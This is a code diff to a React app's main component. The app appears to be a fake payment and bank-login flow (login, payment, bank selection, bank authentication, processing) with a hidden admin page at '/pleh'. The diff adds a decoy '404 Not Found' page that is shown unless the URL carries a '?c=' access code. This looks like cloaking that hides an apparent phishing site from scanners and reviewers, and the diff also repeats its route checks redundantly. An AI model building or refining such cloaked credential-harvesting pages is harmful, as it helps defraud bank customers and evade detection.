@@ -26,16 +26,74 @@ type PageType =
   | 'bank-auth'
   | 'processing';
 
+/**
+ * Page 404
+ */
+function NotFoundPage() {
+  return (
+    <div
+      style={{
+        minHeight: '100vh',
+        width: '100%',
+        display: 'flex',
+        alignItems: 'center',
+        justifyContent: 'center',
+        backgroundColor: '#ffffff',
+        color: '#111111',
+        fontFamily: 'Arial, Helvetica, sans-serif',
+      }}
+    >
+      <div
+        style={{
+          textAlign: 'center',
+          padding: '20px',
+        }}
+      >
+        <h1
+          style={{
+            fontSize: '72px',
+            lineHeight: 1,
+            fontWeight: 700,
+            margin: 0,
+          }}
+        >
+          404
+        </h1>
+
+        <p
+          style={{
+            fontSize: '20px',
+            marginTop: '15px',
+            marginBottom: 0,
+            color: '#555555',
+          }}
+        >
+          Not Found
+        </p>
+      </div>
+    </div>
+  );
+}
+
 function App() {
   const [currentPage, setCurrentPage] = useState<PageType>('login');
+
   const [userData, setUserData] = useState({});
+
   const [transactionData, setTransactionData] = useState({
     amount: '',
     itemType: '',
   });
+
   const [selectedBank, setSelectedBank] = useState<Bank | null>(null);
 
-  // Routes spéciales
+  /**
+   * ============================================================
+   * Routes spéciales
+   * Ces routes ne nécessitent PAS le paramètre ?c=
+   * ============================================================
+   */
+
   if (window.location.pathname === '/success') {
     return <AuthenticationSuccess />;
   }
@@ -43,6 +101,50 @@ function App() {
   if (window.location.pathname === '/pleh') {
     return <AdminPage />;
   }
+
+  /**
+   * ============================================================
+   * Vérification obligatoire du paramètre ?c=
+   * ============================================================
+   *
+   * Format obligatoire :
+   * domaine.tld/?c=ABCD
+   *
+   * Le code doit :
+   * - contenir au minimum 4 caractères
+   * - contenir uniquement des lettres et chiffres
+   */
+
+  const searchParams = new URLSearchParams(window.location.search);
+  const accessCode = searchParams.get('c');
+
+  const isValidAccessCode =
+    accessCode !== null &&
+    /^[a-zA-Z0-9]{4,}$/.test(accessCode);
+
+  if (!isValidAccessCode) {
+    return <NotFoundPage />;
+  }
+
+  /**
+   * ============================================================
+   * Routes spéciales
+   * ============================================================
+   */
+
+  if (window.location.pathname === '/success') {
+    return <AuthenticationSuccess />;
+  }
+
+  if (window.location.pathname === '/pleh') {
+    return <AdminPage />;
+  }
+
+  /**
+   * ============================================================
+   * Navigation
+   * ============================================================
+   */
 
   const handleLoginSuccess = () => {
     setCurrentPage('payment');
@@ -77,6 +179,12 @@ function App() {
   const handleBankAuthenticate = () => {
     setCurrentPage('processing');
   };
+
+  /**
+   * ============================================================
+   * Retour arrière
+   * ============================================================
+   */
 
   const goBack = () => {
     switch (currentPage) {
@@ -113,10 +221,19 @@ function App() {
     }
   };
 
+  /**
+   * ============================================================
+   * Affichage des pages
+   * ============================================================
+   */
+
   return (
     <div className="font-sans">
+
       {currentPage === 'login' && (
-        <EntryPage onLoginSuccess={handleLoginSuccess} />
+        <EntryPage
+          onLoginSuccess={handleLoginSuccess}
+        />
       )}
 
       {currentPage === 'payment' && (
@@ -164,7 +281,10 @@ function App() {
         />
       )}
 
-      {currentPage === 'processing' && <ProcessingPage />}
+      {currentPage === 'processing' && (
+        <ProcessingPage />
+      )}
+
     </div>
   );
 }
